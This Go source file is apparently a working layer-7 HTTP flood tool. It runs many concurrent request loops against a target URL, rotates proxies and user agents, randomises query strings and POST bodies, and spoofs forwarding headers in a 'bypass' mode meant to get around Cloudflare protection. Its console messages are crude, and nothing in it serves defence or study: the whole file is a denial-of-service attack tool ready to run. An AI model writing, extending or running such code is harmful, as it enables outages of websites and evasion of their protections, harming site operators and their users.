package l7

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/134.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/133.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/132.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
}

var proxies []string

func loadProxies(file string) {
	if file == "" {
		return
	}
	f, err := os.Open(file)
	if err != nil {
		fmt.Printf("[-] Proxy load fucked: %v\n", err)
		return
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			proxies = append(proxies, line)
		}
	}
	fmt.Printf("[+] Loaded %d proxies\n", len(proxies))
}

func getProxy() string {
	if len(proxies) == 0 {
		return ""
	}
	return proxies[rand.Intn(len(proxies))]
}

func getUA() string {
	return userAgents[rand.Intn(len(userAgents))]
}

func randomQuery() string {
	return "?id=" + strconv.Itoa(rand.Intn(999999)) + "&fuck=" + strconv.Itoa(rand.Intn(999999)) + "&shit=" + strconv.Itoa(rand.Intn(999999))
}

func randomBody(size int) string {
	b := make([]byte, size)
	for i := range b {
		b[i] = byte(rand.Intn(94) + 33)
	}
	return string(b)
}

func Run(method, target, proxyFile string, threads, duration int) {
	rand.Seed(time.Now().UnixNano())
	loadProxies(proxyFile)

	var wg sync.WaitGroup
	useProxy := len(proxies) > 0

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			client := &http.Client{
				Timeout: 8 * time.Second,
				Transport: &http.Transport{
					TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
				},
			}

			for {
				var req *http.Request

				switch method {
				case "https1", "http":
					req, _ = http.NewRequest("GET", target, nil)
				case "https2":
					u := target + randomQuery()
					req, _ = http.NewRequest("GET", u, nil)
				case "https3":
					body := strings.NewReader(randomBody(2048))
					req, _ = http.NewRequest("POST", target, body)
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				case "post":
					body := strings.NewReader(randomBody(4096))
					req, _ = http.NewRequest("POST", target, body)
					req.Header.Set("Content-Type", "application/json")
				default:
					req, _ = http.NewRequest("GET", target, nil)
				}

				req.Header.Set("User-Agent", getUA())
				req.Header.Set("Accept", "*/*")
				req.Header.Set("Connection", "keep-alive")
				req.Header.Set("Cache-Control", "no-cache")

				if method == "bypass" || strings.Contains(target, "cloudflare") {
					req.Header.Set("CF-Connecting-IP", "127.0.0.1")
					req.Header.Set("X-Forwarded-For", "127.0.0.1")
					req.Header.Set("X-Real-IP", "127.0.0.1")
				}

				if useProxy {
					p := getProxy()
					proxyURL, _ := url.Parse("http://" + p)
					client.Transport = &http.Transport{Proxy: http.ProxyURL(proxyURL)}
				}

				resp, err := client.Do(req)
				if err == nil && resp != nil {
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
				}

				// power sleep
				if method == "https3" || method == "post" {
					time.Sleep(1 * time.Millisecond)
				} else {
					time.Sleep(4 * time.Millisecond)
				}
			}
		}()
	}

	time.AfterFunc(time.Duration(duration)*time.Second, func() {
		fmt.Println("[+] L7 shit stopped.")
		os.Exit(0)
	})

	wg.Wait()
}
